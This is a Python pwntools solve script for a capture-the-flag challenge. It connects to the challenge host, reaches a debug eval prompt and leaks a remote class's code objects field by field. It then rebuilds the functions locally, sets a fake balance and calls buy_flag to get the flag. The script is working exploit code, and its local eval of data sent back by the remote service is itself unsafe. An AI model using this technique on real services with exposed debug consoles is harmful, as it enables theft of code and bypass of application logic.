#!/usr/bin/env python3.10
#from: https://gist.github.com/tzlils/5779d03919d6873debd1e20baba6c84b

from pwn import *
import dis
from types import CodeType, FunctionType

r = remote('01.linux.challenges.ctf.thefewchosen.com', 49604)

def get_remote_value(s, t=eval):
    r.sendline(s.encode())
    d = r.recvuntil(b'DEBUG>>> ')[:-9]
    n = t(d)
    print(n)
    return n

def leak_function(name):
    return CodeType(
        get_remote_value(f'{name}.__code__.co_argcount', t=int),
        get_remote_value(f'{name}.__code__.co_posonlyargcount', t=int),
        get_remote_value(f'{name}.__code__.co_kwonlyargcount', t=int),
        get_remote_value(f'{name}.__code__.co_nlocals', t=int),
        get_remote_value(f'{name}.__code__.co_stacksize', t=int),
        get_remote_value(f'{name}.__code__.co_flags', t=int),
        get_remote_value(f'{name}.__code__.co_code'), #bytes
        get_remote_value(f'{name}.__code__.co_consts'), #tuple
        get_remote_value(f'{name}.__code__.co_names'), #tuple
        get_remote_value(f'{name}.__code__.co_varnames'), #tuple
        get_remote_value(f'{name}.__code__.co_filename', t=bytes).decode().strip(),
        get_remote_value(f'{name}.__code__.co_name', t=bytes).decode().strip(),
        get_remote_value(f'{name}.__code__.co_firstlineno', t=int),
        get_remote_value(f'{name}.__code__.co_lnotab'), # bytes
        get_remote_value(f'{name}.__code__.co_cellvars'), # tuple 
        get_remote_value(f'{name}.__code__.co_freevars'), #tuple
    )

r.recvuntil(b':')
r.sendline(b'\x00')
r.recvuntil(b'>>> ')
r.sendline(b'42')
r.recvuntil(b'DEBUG>>> ')

import random
Controller = type('Controller', (), {
    '__init__':         FunctionType(leak_function('controller.__init__'), {}),
    'buy_flag':         FunctionType(leak_function('controller.buy_flag'), {'ord': ord, 'random': random, 'seed': random.seed}),
    'check_balance':    FunctionType(leak_function('controller.check_balance'), {}),
    'work':             FunctionType(leak_function('controller.work'), {}),
})

controller = Controller('tzlil')
controller.money = 1338
print(controller.buy_flag())